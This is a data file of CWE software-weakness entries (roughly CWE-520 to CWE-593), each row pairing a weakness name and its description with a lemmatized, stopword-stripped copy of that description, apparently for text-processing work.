CWE-520,.NET Misconfiguration: Use of Impersonation,"Allowing a .NET application to run at potentially escalated levels of access to the underlying operating and file systems can be dangerous and result in various forms of attacks..NET server applications can optionally execute using the identity of the user authenticated to the client. The intention of this functionality is to bypass authentication and access control checks within the .NET application code. Authentication is done by the underlying web server (Microsoft Internet Information Service IIS), which passes the authenticated token, or unauthenticated anonymous token, to the .NET application. Using the token to impersonate the client, the application then relies on the settings within the NTFS directories and files to control access. Impersonation enables the application, on the server running the .NET application, to both execute code and access resources in the context of the authenticated and authorized user.",allow application run potentially escalate level access underlying operating file system dangerous result form attack net server application optionally execute identity user authenticate client intention functionality bypass authentication access control check application code authentication underlying web server microsoft internet information service iis pass authenticate token unauthenticated anonymous token application token impersonate client application rely setting ntfs directory file control access impersonation enable application server run application execute code access resource context authenticated authorized user
CWE-521,Weak Password Requirements,"The product does not require that users should have strong passwords, which makes it easier for attackers to compromise user accounts.Authentication mechanisms often rely on a memorized secret (also known as a password) to provide an assertion of identity for a user of a system. It is therefore important that this password be of sufficient complexity and impractical for an adversary to guess. The specific requirements around how complex a password needs to be depends on the type of system being protected. Selecting the correct password requirements and enforcing them through implementation are critical to the overall success of the authentication mechanism.",product require user strong password make easy attacker compromise user account authentication mechanism rely memorize secret know password provide assertion identity user system important password sufficient complexity impractical adversary guess specific requirement complex password need depend type system protect select correct password requirement enforce implementation critical overall success authentication mechanism
CWE-522,Insufficiently Protected Credentials,"The product transmits or stores authentication credentials, but it uses an insecure method that is susceptible to unauthorized interception and/or retrieval.",product transmit store authentication credential use insecure method susceptible unauthorized interception retrieval
CWE-523,Unprotected Transport of Credentials,Login pages do not use adequate measures to protect the user name and password while they are in transit from the client to the server.,login page use adequate measure protect user password transit client server
CWE-524,Use of Cache Containing Sensitive Information,"The code uses a cache that contains sensitive information, but the cache can be read by an actor outside of the intended control sphere.Applications may use caches to improve efficiency when communicating with remote entities or performing intensive calculations. A cache maintains a pool of objects, threads, connections, pages, financial data, passwords, or other resources to minimize the time it takes to initialize and access these resources. If the cache is accessible to unauthorized actors, attackers can read the cache and obtain this sensitive information.",code use cache contain sensitive information cache read actor outside intended control sphere application use cache improve efficiency communicate remote entity perform intensive calculation cache maintain pool object thread connection page financial datum password resource minimize time take initialize access resource cache accessible unauthorized actor attacker read cache obtain sensitive information
CWE-525,Use of Web Browser Cache Containing Sensitive Information,The web application does not use an appropriate caching policy that specifies the extent to which each web page and associated form fields should be cached.,web application use appropriate caching policy specify extent web page associate form field cache
CWE-526,Cleartext Storage of Sensitive Information in an Environment Variable,"The product uses an environment variable to store unencrypted sensitive information.Information stored in an environment variable can be accessible by other processes with the execution context, including child processes that dependencies are executed in, or serverless functions in cloud environments. An environment variable's contents can also be inserted into messages, headers, log files, or other outputs. Often these other dependencies have no need to use the environment variable in question. A weakness that discloses environment variables could expose this information.",product use environment variable store unencrypted sensitive information information store environment variable accessible process execution context include child process dependency execute serverless function cloud environment environment variable content insert message header log file output dependency need use environment variable question weakness disclose environment variable expose information
CWE-527,Exposure of Version-Control Repository to an Unauthorized Control Sphere,"The product stores a CVS, git, or other repository in a directory, archive, or other resource that is stored, transferred, or otherwise made accessible to unauthorized actors.Version control repositories such as CVS or git store version-specific metadata and other details within subdirectories. If these subdirectories are stored on a web server or added to an archive, then these could be used by an attacker. This information may include usernames, filenames, path root, IP addresses, and detailed ""diff"" data about how files have been changed - which could reveal source code snippets that were never intended to be made public.",product store cvs git repository directory archive resource store transfer accessible unauthorized actor version control repository cvs git store version specific metadata detail subdirectory subdirectory store web server add archive attacker information include username filename path root ip address detailed diff datum file change reveal source code snippet intend public
CWE-528,Exposure of Core Dump File to an Unauthorized Control Sphere,"The product generates a core dump file in a directory, archive, or other resource that is stored, transferred, or otherwise made accessible to unauthorized actors.",product generate core dump file directory archive resource store transfer accessible unauthorized actor
CWE-529,Exposure of Access Control List Files to an Unauthorized Control Sphere,The product stores access control list files in a directory or other container that is accessible to actors outside of the intended control sphere.Exposure of these access control list files may give the attacker information about the configuration of the site or system. This information may then be used to bypass the intended security policy or identify trusted systems from which an attack can be launched.,product store access control list file directory container accessible actor outside intended control sphere exposure access control list file attacker information configuration site system information bypass intended security policy identify trusted system attack launch
CWE-53,Path Equivalence: '\multiple\\internal\backslash',"The product accepts path input in the form of multiple internal backslash ('\multiple\trailing\\slash') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.",product accept path input form multiple internal backslash appropriate validation lead ambiguous path resolution allow attacker traverse file system unintended location access arbitrary file
CWE-530,Exposure of Backup File to an Unauthorized Control Sphere,"A backup file is stored in a directory or archive that is made accessible to unauthorized actors.Often, older backup files are renamed with an extension such as .~bk to distinguish them from production files. The source code for old files that have been renamed in this manner and left in the webroot can often be retrieved. This renaming may have been performed automatically by the web server, or manually by the administrator.",backup file store directory archive accessible unauthorized actor old backup file rename extension distinguish production file source code old file rename manner leave webroot retrieve renaming perform automatically web server manually administrator
CWE-531,Inclusion of Sensitive Information in Test Code,"Accessible test applications can pose a variety of security risks. Since developers or administrators rarely consider that someone besides themselves would even know about the existence of these applications, it is common for them to contain sensitive information or functions.",accessible test application pose variety security risk developer administrator rarely consider know existence application common contain sensitive information function
CWE-532,Insertion of Sensitive Information into Log File,"Information written to log files can be of a sensitive nature and give valuable guidance to an attacker or expose sensitive user information.While logging all information may be helpful during development stages, it is important that logging levels be set appropriately before a product ships so that sensitive user data and system information are not accidentally exposed to potential attackers.Different log files may be produced and stored for:Server log files (e.g. server.log). This can give information on whatever application left the file. Usually this can give full path names and system information, and sometimes usernames and passwords.log files that are used for debugging",information write log file sensitive nature valuable guidance attacker expose sensitive user information log information helpful development stage important logging level set appropriately product ship sensitive user datum system information accidentally expose potential attacker different log file produce store server log file information application leave file usually path name system information username file debugging
CWE-533,DEPRECATED: Information Exposure Through Server Log Files,This entry has been deprecated because its abstraction was too low-level. See CWE-532.,entry deprecate abstraction low level
CWE-534,DEPRECATED: Information Exposure Through Debug Log Files,This entry has been deprecated because its abstraction was too low-level. See CWE-532.,entry deprecate abstraction low level
CWE-535,Exposure of Information Through Shell Error Message,"A command shell error message indicates that there exists an unhandled exception in the web application code. In many cases, an attacker can leverage the conditions that cause these errors in order to gain unauthorized access to the system.",command shell error message indicate exist unhandled exception web application code case attacker leverage condition cause error order gain unauthorized access system
CWE-536,Servlet Runtime Error Message Containing Sensitive Information,A servlet error message indicates that there exists an unhandled exception in your web application code and may provide useful information to an attacker.,servlet error message indicate exist unhandled exception web application code provide useful information attacker
CWE-537,Java Runtime Error Message Containing Sensitive Information,"In many cases, an attacker can leverage the conditions that cause unhandled exception errors in order to gain unauthorized access to the system.",case attacker leverage condition cause unhandled exception error order gain unauthorized access system
CWE-538,Insertion of Sensitive Information into Externally-Accessible File or Directory,"The product places sensitive information into files or directories that are accessible to actors who are allowed to have access to the files, but not to the sensitive information.",product place sensitive information file directory accessible actor allow access file sensitive information
CWE-539,Use of Persistent Cookies Containing Sensitive Information,"The web application uses persistent cookies, but the cookies contain sensitive information.Cookies are small bits of data that are sent by the web application but stored locally in the browser. This lets the application use the cookie to pass information between pages and store variable information. The web application controls what information is stored in a cookie and how it is used. Typical types of information stored in cookies are session identifiers, personalization and customization information, and in rare cases even usernames to enable automated logins. There are two different types of cookies: session cookies and persistent cookies. Session cookies just live in the browser's memory and are not stored anywhere, but persistent cookies are stored on the browser's hard drive. This can cause security and privacy issues depending on the information stored in the cookie and how it is accessed.",web application use persistent cookie cookie contain sensitive information cookie small bit datum send web application store locally browser let application use cookie pass information page store variable information web application control information store cookie typical type information store cookie session identifier personalization customization information rare case username enable automate login different type cookie session cookie persistent cookie session cookie live browser memory store persistent cookie store browser hard drive cause security privacy issue depend information store cookie access
CWE-54,Path Equivalence: 'filedir\' (Trailing Backslash),"The product accepts path input in the form of trailing backslash ('filedir\') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.",product accept path input form trail backslash appropriate validation lead ambiguous path resolution allow attacker traverse file system unintended location access arbitrary file
CWE-540,Inclusion of Sensitive Information in Source Code,"Source code on a web server or repository often contains sensitive information and should generally not be accessible to users.There are situations where it is critical to remove source code from an area or server. For example, obtaining Perl source code on a system allows an attacker to understand the logic of the script and extract extremely useful information such as code bugs or logins and passwords.",source code web server repository contain sensitive information generally accessible user situation critical remove source code area server example obtain perl source code system allow attacker understand logic script extract extremely useful information code bug login password
CWE-541,Inclusion of Sensitive Information in an Include File,"If an include file source is accessible, the file can contain usernames and passwords, as well as sensitive information pertaining to the application and system.",include file source accessible file contain username password sensitive information pertain application system
CWE-542,DEPRECATED: Information Exposure Through Cleanup Log Files,This entry has been deprecated because its abstraction was too low-level. See CWE-532.,entry deprecate abstraction low level
CWE-543,Use of Singleton Pattern Without Synchronization in a Multithreaded Context,The product uses the singleton pattern when creating a resource within a multithreaded environment.The use of a singleton pattern may not be thread-safe.,product use singleton pattern create resource multithreaded environment use singleton pattern thread safe
CWE-544,Missing Standardized Error Handling Mechanism,"The product does not use a standardized method for handling errors throughout the code, which might introduce inconsistent error handling and resultant weaknesses.If the product handles error messages individually, on a one-by-one basis, this is likely to result in inconsistent error handling. The causes of errors may be lost. Also, detailed information about the causes of an error may be unintentionally returned to the user.",product use standardized method handle error code introduce inconsistent error handling resultant weakness product handle error message individually basis likely result inconsistent error handling cause error lose detailed information cause error unintentionally return user
CWE-545,DEPRECATED: Use of Dynamic Class Loading,"This weakness has been deprecated because it partially overlaps CWE-470, it describes legitimate programmer behavior, and other portions will need to be integrated into other entries.",weakness deprecate partially overlap describe legitimate programmer behavior portion need integrate entry
CWE-546,Suspicious Comment,"The code contains comments that suggest the presence of bugs, incomplete functionality, or weaknesses.Many suspicious comments, such as BUG, HACK, FIXME, LATER, LATER2, TODO, in the code indicate missing security functionality and checking. Others indicate code problems that programmers should fix, such as hard-coded variables, error handling, not using stored procedures, and performance issues.",code contain comment suggest presence bug incomplete functionality weakness suspicious comment bug hack fixme later todo code indicate miss security functionality checking indicate code problem programmer fix hard code variable error handling store procedure performance issue
CWE-547,"Use of Hard-coded, Security-relevant Constants","The product uses hard-coded constants instead of symbolic names for security-critical values, which increases the likelihood of mistakes during code maintenance or security policy change.If the developer does not find all occurrences of the hard-coded constants, an incorrect policy decision may be made if one of the constants is not changed. Making changes to these values will require code changes that may be difficult or impossible once the system is released to the field. In addition, these hard-coded values may become available to attackers if the code is ever disclosed.",product use hard code constant instead symbolic name security critical value increase likelihood mistake code maintenance security policy change developer find occurrence hard code constant incorrect policy decision constant change make change value require code change difficult impossible system release field addition hard code value available attacker code disclose
CWE-548,Exposure of Information Through Directory Listing,"A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers.A directory listing provides an attacker with the complete index of all the resources located inside of the directory. The specific risks and consequences vary depending on which files are listed and accessible.",directory listing inappropriately expose yield potentially sensitive information attacker directory listing provide attacker complete index resource locate inside directory specific risk consequence vary depend file list accessible
CWE-549,Missing Password Field Masking,"The product does not mask passwords during entry, increasing the potential for attackers to observe and capture passwords.",product mask password entry increase potential attacker observe capture password
CWE-55,Path Equivalence: '/./' (Single Dot Directory),"The product accepts path input in the form of single dot directory exploit ('/./') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.",product accept path input form single dot directory exploit appropriate validation lead ambiguous path resolution allow attacker traverse file system unintended location access arbitrary file
CWE-550,Server-generated Error Message Containing Sensitive Information,"Certain conditions, such as network failure, will cause a server error message to be displayed.While error messages in and of themselves are not dangerous, per se, it is what an attacker can glean from them that might cause eventual problems.",certain condition network failure cause server error message display error message dangerous se attacker glean cause eventual problem
CWE-551,Incorrect Behavior Order: Authorization Before Parsing and Canonicalization,"If a web server does not fully parse requested URLs before it examines them for authorization, it may be possible for an attacker to bypass authorization protection.For instance, the character strings /./ and / both mean current directory. If /SomeDirectory is a protected directory and an attacker requests /./SomeDirectory, the attacker may be able to gain access to the resource if /./ is not converted to / before the authorization check is performed.",web server fully parse request url examine authorization possible attacker bypass authorization protection instance character string mean current directory protected directory attacker request attacker able gain access resource convert authorization check perform
CWE-552,Files or Directories Accessible to External Parties,"The product makes files or directories accessible to unauthorized actors, even though they should not be.Web servers, FTP servers, and similar servers may store a set of files underneath a ""root"" directory that is accessible to the server's users. Applications may store sensitive files underneath this root without also using access control to limit which users may request those files, if any. Alternately, an application might package multiple files or directories into an archive file (e.g., ZIP or tar), but the application might not exclude sensitive files that are underneath those directories.In cloud technologies and containers, this weakness might present itself in the form of misconfigured storage accounts that can be read or written by a public or anonymous user.",product make file directory accessible unauthorized actor web server ftp server similar server store set file underneath root directory accessible server user application store sensitive file underneath root access control limit user request file alternately application package multiple file directory archive file zip tar application exclude sensitive file underneath directory cloud technology container weakness present form misconfigured storage account read write public anonymous user
CWE-553,Command Shell in Externally Accessible Directory,A possible shell file exists in /cgi-bin/ or other accessible directories. This is extremely dangerous and can be used by an attacker to execute commands on the web server.,possible shell file exist accessible directory extremely dangerous attacker execute command web server
CWE-554,ASP.NET Misconfiguration: Not Using Input Validation Framework,The ASP.NET application does not use an input validation framework.,application use input validation framework
CWE-555,J2EE Misconfiguration: Plaintext Password in Configuration File,"The J2EE application stores a plaintext password in a configuration file.Storing a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resource, making it an easy target for attackers.",application store plaintext password configuration file store plaintext password configuration file allow read file access password protect resource make easy target attacker
CWE-556,ASP.NET Misconfiguration: Use of Identity Impersonation,Configuring an ASP.NET application to run with impersonated credentials may give the application unnecessary privileges.The use of impersonated credentials allows an ASP.NET application to run with either the privileges of the client on whose behalf it is executing or with arbitrary privileges granted in its configuration.,configure application run impersonated credential application unnecessary privilege use impersonated credential allow application run privilege client behalf execute arbitrary privilege grant configuration
CWE-558,Use of getlogin() in Multithreaded Application,"The product uses the getlogin() function in a multithreaded context, potentially causing it to return incorrect values.The getlogin() function returns a pointer to a string that contains the name of the user associated with the calling process. The function is not reentrant, meaning that if it is called from another process, the contents are not locked out and the value of the string can be changed by another process. This makes it very risky to use because the username can be changed by other processes, so the results of the function cannot be trusted.",product use getlogin function multithreaded context potentially cause return incorrect value getlogin function return pointer string contain user associate call process function reentrant mean call process content lock value string change process make risky use username change process result function trust
CWE-56,Path Equivalence: 'filedir*' (Wildcard),"The product accepts path input in the form of asterisk wildcard ('filedir*') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.",product accept path input form asterisk wildcard filedir appropriate validation lead ambiguous path resolution allow attacker traverse file system unintended location access arbitrary file
CWE-560,Use of umask() with chmod-style Argument,The product calls umask() with an incorrect argument that is specified as if it is an argument to chmod().,product call umask incorrect argument specify argument chmod
CWE-561,Dead Code,"The product contains dead code, which can never be executed.Dead code is code that can never be executed in a running program. The surrounding code makes it impossible for a section of code to ever be executed.",product contain dead code execute dead code code execute run program surround code make impossible section code execute
CWE-562,Return of Stack Variable Address,"A function returns the address of a stack variable, which will cause unintended program behavior, typically in the form of a crash.Because local variables are allocated on the stack, when a program returns a pointer to a local variable, it is returning a stack address. A subsequent function call is likely to re-use this same stack address, thereby overwriting the value of the pointer, which no longer corresponds to the same variable since a function's stack frame is invalidated when it returns. At best this will cause the value of the pointer to change unexpectedly. In many cases it causes the program to crash the next time the pointer is dereferenced.",function return address stack variable cause unintended program behavior typically form crash local variable allocate stack program return pointer local variable return stack address subsequent function likely use stack address overwrite value pointer long correspond variable function stack frame invalidate return well cause value pointer change unexpectedly case cause program crash time pointer dereference
CWE-563,Assignment to Variable without Use,"The variable's value is assigned but never used, making it a dead store.After the assignment, the variable is either assigned another value or goes out of scope. It is likely that the variable is simply vestigial, but it is also possible that the unused variable points out a bug.",variable value assign make dead store assignment variable assign value go scope likely variable simply vestigial possible unused variable point bug
CWE-564,SQL Injection: Hibernate,Using Hibernate to execute a dynamic SQL statement built with user-controlled input can allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.,hibernate execute dynamic sql statement build user control input allow attacker modify statement meaning execute arbitrary sql command
CWE-565,Reliance on Cookies without Validation and Integrity Checking,"The product relies on the existence or values of cookies when performing security-critical operations, but it does not properly ensure that the setting is valid for the associated user.Attackers can easily modify cookies, within the browser or by implementing the client-side code outside of the browser. Reliance on cookies without detailed validation and integrity checking can allow attackers to bypass authentication, conduct injection attacks such as SQL injection and cross-site scripting, or otherwise modify inputs in unexpected ways.",product rely existence value cookie perform security critical operation properly ensure setting valid associate user attacker easily modify cookie browser implement client code outside browser reliance cookie detailed validation integrity checking allow attacker bypass authentication conduct injection attack sql injection cross site scripting modify input unexpected way
CWE-566,Authorization Bypass Through User-Controlled SQL Primary Key,"The product uses a database table that includes records that should not be accessible to an actor, but it executes a SQL statement with a primary key that can be controlled by that actor.When a user can set a primary key to any value, then the user can modify the key to point to unauthorized records.Database access control errors occur when:Data enters a program from an untrusted source.The data is used to specify the value of a primary key in a SQL query.The untrusted source does not have the permissions to be able to access all rows in the associated table.",product use database table include record accessible actor execute sql statement primary key control actor user set primary key value user modify key point unauthorized record database access control error occur data enter program untrusted source data specify value primary key sql query untrusted source permission able access row associated table
CWE-567,Unsynchronized Access to Shared Data in a Multithreaded Context,"The product does not properly synchronize shared data, such as static variables across threads, which can lead to undefined behavior and unpredictable data changes.Within servlets, shared static variables are not protected from concurrent access, but servlets are multithreaded. This is a typical programming mistake in J2EE applications, since the multithreading is handled by the framework. When a shared variable can be influenced by an attacker, one thread could wind up modifying the variable to contain data that is not valid for a different thread that is also using the data within the variable.Note that this weakness is not unique to servlets.",product properly synchronize share datum static variable thread lead undefined behavior unpredictable datum change servlet share static variable protect concurrent access servlet multithreade typical programming mistake application multithreading handle framework share variable influence attacker thread wind modify variable contain datum valid different thread datum variable note weakness unique servlet
CWE-568,finalize() Method Without super.finalize(),The product contains a finalize() method that does not call super.finalize().The Java Language Specification states that it is a good practice for a finalize() method to call super.finalize().,product contain finalize method java language specification state good practice finalize method
CWE-57,Path Equivalence: 'fakedir/../realdir/filename',"The product contains protection mechanisms to restrict access to 'realdir/filename', but it constructs pathnames using external input in the form of 'fakedir/../realdir/filename' that are not handled by those mechanisms. This allows attackers to perform unauthorized actions against the targeted file.",product contain protection mechanism restrict access realdir filename construct pathname external input form filename handle mechanism allow attacker perform unauthorized action target file
CWE-570,Expression is Always False,The product contains an expression that will always evaluate to false.,product contain expression evaluate false
CWE-571,Expression is Always True,The product contains an expression that will always evaluate to true.,product contain expression evaluate true
CWE-572,Call to Thread run() instead of start(),"The product calls a thread's run() method instead of calling start(), which causes the code to run in the thread of the caller instead of the callee.In most cases a direct call to a Thread object's run() method is a bug. The programmer intended to begin a new thread of control, but accidentally called run() instead of start(), so the run() method will execute in the caller's thread of control.",product call thread run method instead call start cause code run thread caller instead callee case direct thread object run method bug programmer intend begin new thread control accidentally call run instead start run method execute caller thread control
CWE-573,Improper Following of Specification by Caller,"The product does not follow or incorrectly follows the specifications as required by the implementation language, environment, framework, protocol, or platform.When leveraging external functionality, such as an API, it is important that the caller does so in accordance with the requirements of the external functionality or else unintended behaviors may result, possibly leaving the system vulnerable to any number of exploits.",product follow incorrectly follow specification require implementation language environment framework protocol platform leverage external functionality api important caller accordance requirement external functionality unintended behavior result possibly leave system vulnerable number exploit
CWE-574,EJB Bad Practices: Use of Synchronization Primitives,"The product violates the Enterprise JavaBeans (EJB) specification by using thread synchronization primitives.The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the product violates the following EJB guideline: ""An enterprise bean must not use thread synchronization primitives to synchronize execution of multiple instances."" The specification justifies this requirement in the following way: ""This rule is required to ensure consistent runtime semantics because while some EJB containers may use a single JVM to execute all enterprise bean's instances, others may distribute the instances across multiple JVMs.""",product violate enterprise javabeans ejb specification thread synchronization primitive enterprise javabeans specification require bean provider follow set programming guideline design ensure bean portable behave consistently ejb container case product violate following ejb guideline enterprise bean use thread synchronization primitive synchronize execution multiple instance specification justify requirement following way rule require ensure consistent runtime semantic ejb container use single jvm execute enterprise bean instance distribute instance multiple jvm
CWE-575,EJB Bad Practices: Use of AWT Swing,"The product violates the Enterprise JavaBeans (EJB) specification by using AWT/Swing.The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the product violates the following EJB guideline: ""An enterprise bean must not use the AWT functionality to attempt to output information to a display, or to input information from a keyboard."" The specification justifies this requirement in the following way: ""Most servers do not allow direct interaction between an application program and a keyboard/display attached to the server system.""",product violate enterprise javabeans ejb specification awt swing enterprise javabeans specification require bean provider follow set programming guideline design ensure bean portable behave consistently ejb container case product violate following ejb guideline enterprise bean use awt functionality attempt output information display input information keyboard specification justify requirement following way server allow direct interaction application program keyboard display attach server system
CWE-576,EJB Bad Practices: Use of Java I/O,"The product violates the Enterprise JavaBeans (EJB) specification by using the java.io package.The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the product violates the following EJB guideline: ""An enterprise bean must not use the java.io package to attempt to access files and directories in the file system."" The specification justifies this requirement in the following way: ""The file system APIs are not well-suited for business components to access data. Business components should use a resource manager API, such as JDBC, to store data.""",product violate enterprise javabeans ejb specification package enterprise javabeans specification require bean provider follow set programming guideline design ensure bean portable behave consistently ejb container case product violate following ejb guideline enterprise bean use package attempt access file directory file system specification justify requirement following way file system api suit business component access datum business component use resource manager api jdbc store datum
CWE-577,EJB Bad Practices: Use of Sockets,"The product violates the Enterprise JavaBeans (EJB) specification by using sockets.The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the product violates the following EJB guideline: ""An enterprise bean must not attempt to listen on a socket, accept connections on a socket, or use a socket for multicast."" The specification justifies this requirement in the following way: ""The EJB architecture allows an enterprise bean instance to be a network socket client, but it does not allow it to be a network server. Allowing the instance to become a network server would conflict with the basic function of the enterprise bean-- to serve the EJB clients.""",product violate enterprise javabeans ejb specification socket enterprise javabeans specification require bean provider follow set programming guideline design ensure bean portable behave consistently ejb container case product violate following ejb guideline enterprise bean attempt listen socket accept connection socket use socket multicast specification justify requirement following way ejb architecture allow enterprise bean instance network socket client allow network server allow instance network server conflict basic function enterprise serve ejb client
CWE-578,EJB Bad Practices: Use of Class Loader,"The product violates the Enterprise JavaBeans (EJB) specification by using the class loader.The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the product violates the following EJB guideline: ""The enterprise bean must not attempt to create a class loader; obtain the current class loader; set the context class loader; set security manager; create a new security manager; stop the JVM; or change the input, output, and error streams."" The specification justifies this requirement in the following way: ""These functions are reserved for the EJB container. Allowing the enterprise bean to use these functions could compromise security and decrease the container's ability to properly manage the runtime environment.""",product violate enterprise javabeans ejb specification class loader enterprise javabeans specification require bean provider follow set programming guideline design ensure bean portable behave consistently ejb container case product violate following ejb guideline enterprise bean attempt create class loader obtain current class loader set context class loader set security manager create new security manager stop jvm change input output error stream specification justify requirement following way function reserve ejb container allow enterprise bean use function compromise security decrease container ability properly manage runtime environment
CWE-579,J2EE Bad Practices: Non-serializable Object Stored in Session,"The product stores a non-serializable object as an HttpSession attribute, which can hurt reliability.A J2EE application can make use of multiple JVMs in order to improve application reliability and performance. In order to make the multiple JVMs appear as a single application to the end user, the J2EE container can replicate an HttpSession object across multiple JVMs so that if one JVM becomes unavailable another can step in and take its place without disrupting the flow of the application. This is only possible if all session data is serializable, allowing the session to be duplicated between the JVMs.",product store non serializable object httpsession attribute hurt reliability application use multiple jvm order improve application reliability performance order multiple jvm appear single application end user container replicate httpsession object multiple jvm jvm unavailable step place disrupt flow application possible session data serializable allow session duplicate jvm
CWE-58,Path Equivalence: Windows 8.3 Filename,"The product contains a protection mechanism that restricts access to a long filename on a Windows operating system, but it does not properly restrict access to the equivalent short ""8.3"" filename.On later Windows operating systems, a file can have a ""long name"" and a short name that is compatible with older Windows file systems, with up to 8 characters in the filename and 3 characters for the extension. These ""8.3"" filenames, therefore, act as an alternate name for files with long names, so they are useful pathname equivalence manipulations.",product contain protection mechanism restrict access long filename windows operate system properly restrict access equivalent short filename later windows operate system file long short compatible old windows file system character filename character extension filename act alternate file long name useful pathname equivalence manipulation
CWE-580,clone() Method Without super.clone(),"The product contains a clone() method that does not call super.clone() to obtain the new object.All implementations of clone() should obtain the new object by calling super.clone(). If a class does not follow this convention, a subclass's clone() method will return an object of the wrong type.",product contain clone method obtain new object implementation clone obtain new object call class follow convention subclass clone method return object wrong type
CWE-581,Object Model Violation: Just One of Equals and Hashcode Defined,"The product does not maintain equal hashcodes for equal objects.Java objects are expected to obey a number of invariants related to equality. One of these invariants is that equal objects must have equal hashcodes. In other words, if a.equals(b) == true then a.hashCode() == b.hashCode().",product maintain equal hashcode equal object java object expect obey number invariant relate equality invariant equal object equal hashcode word true
CWE-582,"Array Declared Public, Final, and Static","The product declares an array public, final, and static, which is not sufficient to prevent the array's contents from being modified.Because arrays are mutable objects, the final constraint requires that the array object itself be assigned only once, but makes no guarantees about the values of the array elements. Since the array is public, a malicious program can change the values stored in the array. As such, in most cases an array declared public, final and static is a bug.",product declare array public final static sufficient prevent array content modify array mutable object final constraint require array object assign make guarantee value array element array public malicious program change value store array case array declare public final static bug
CWE-583,finalize() Method Declared Public,"The product violates secure coding principles for mobile code by declaring a finalize() method public.A product should never call finalize explicitly, except to call super.finalize() inside an implementation of finalize(). In mobile code situations, the otherwise error prone practice of manual garbage collection can become a security threat if an attacker can maliciously invoke a finalize() method because it is declared with public access.",product violate secure coding principle mobile code declare finalize method public product finalize explicitly inside implementation finalize mobile code situation error prone practice manual garbage collection security threat attacker maliciously invoke finalize method declare public access
CWE-584,Return Inside Finally Block,"The code has a return statement inside a finally block, which will cause any thrown exception in the try block to be discarded.",code return statement inside finally block cause throw exception try block discard
CWE-585,Empty Synchronized Block,The product contains an empty synchronized block.An empty synchronized block does not actually accomplish any synchronization and may indicate a troubled section of code. An empty synchronized block can occur because code no longer needed within the synchronized block is commented out without removing the synchronized block.,product contain synchronize block synchronize block actually accomplish synchronization indicate troubled section code synchronize block occur code long need synchronize block comment remove synchronize block
CWE-586,Explicit Call to Finalize(),"The product makes an explicit call to the finalize() method from outside the finalizer.While the Java Language Specification allows an object's finalize() method to be called from outside the finalizer, doing so is usually a bad idea. For example, calling finalize() explicitly means that finalize() will be called more than once: the first time will be the explicit call and the last time will be the call that is made after the object is garbage collected.",product make explicit finalize method outside finalizer java language specification allow object finalize method call outside finalizer usually bad idea example call finalize explicitly mean finalize call time explicit time object garbage collect
CWE-587,Assignment of a Fixed Address to a Pointer,"The product sets a pointer to a specific address other than NULL or 0.Using a fixed address is not portable, because that address will probably not be valid in all environments or platforms.",product set pointer specific address null fix address portable address probably valid environment platform
CWE-588,Attempt to Access Child of a Non-structure Pointer,Casting a non-structure type to a structure type and accessing a field can lead to memory access errors or data corruption.,cast non structure type structure type access field lead memory access error data corruption
CWE-589,Call to Non-ubiquitous API,"The product uses an API function that does not exist on all versions of the target platform. This could cause portability problems or inconsistencies that allow denial of service or other consequences.Some functions that offer security features supported by the OS are not available on all versions of the OS in common use. Likewise, functions are often deprecated or made obsolete for security reasons and should not be used.",product use api function exist version target platform cause portability problem inconsistency allow denial service consequence function offer security feature support os available version os common use likewise function deprecate obsolete security reason
CWE-59,Improper Link Resolution Before File Access ('Link Following'),"The product attempts to access a file based on the filename, but it does not properly prevent that filename from identifying a link or shortcut that resolves to an unintended resource.",product attempt access file base filename properly prevent filename identify link shortcut resolve unintended resource
CWE-590,Free of Memory not on the Heap,"The product calls free() on a pointer to memory that was not allocated using associated heap allocation functions such as malloc(), calloc(), or realloc().When free() is called on an invalid pointer, the program's memory management data structures may become corrupted. This corruption can cause the program to crash or, in some circumstances, an attacker may be able to cause free() to operate on controllable memory locations to modify critical program variables or execute code.",product call free pointer memory allocate associate heap allocation function malloc calloc free call invalid pointer program memory management datum structure corrupted corruption cause program crash circumstance attacker able cause free operate controllable memory location modify critical program variable execute code
CWE-591,Sensitive Data Storage in Improperly Locked Memory,"The product stores sensitive data in memory that is not locked, or that has been incorrectly locked, which might cause the memory to be written to swap files on disk by the virtual memory manager. This can make the data more accessible to external actors.On Windows systems the VirtualLock function can lock a page of memory to ensure that it will remain present in memory and not be swapped to disk. However, on older versions of Windows, such as 95, 98, or Me, the VirtualLock() function is only a stub and provides no protection. On POSIX systems the mlock() call ensures that a page will stay resident in memory but does not guarantee that the page will not appear in the swap. Therefore, it is unsuitable for use as a protection mechanism for sensitive data. Some platforms, in particular Linux, do make the guarantee that the page will not be swapped, but this is non-standard and is not portable. Calls to mlock() also require supervisor privilege. Return values for both of these calls must be checked to ensure that the lock operation was actually successful.",product store sensitive datum memory lock incorrectly lock cause memory write swap file disk virtual memory manager datum accessible external actor windows system virtuallock function lock page memory ensure remain present memory swap disk old version windows virtuallock function stub provide protection posix system mlock ensure page stay resident memory guarantee page appear swap unsuitable use protection mechanism sensitive datum platform particular linux guarantee page swap non standard portable call mlock require supervisor privilege return value call check ensure lock operation actually successful
CWE-592,DEPRECATED: Authentication Bypass Issues,This weakness has been deprecated because it covered redundant concepts already described in CWE-287.,weakness deprecate cover redundant concept describe
CWE-593,Authentication Bypass: OpenSSL CTX Object Modified after SSL Objects are Created,"The product modifies the SSL context after connection creation has begun.If the program modifies the SSL_CTX object after creating SSL objects from it, there is the possibility that older SSL objects created from the original context could all be affected by that change.",product modify ssl context connection creation begin program modify object create ssl object possibility old ssl object create original context affect change
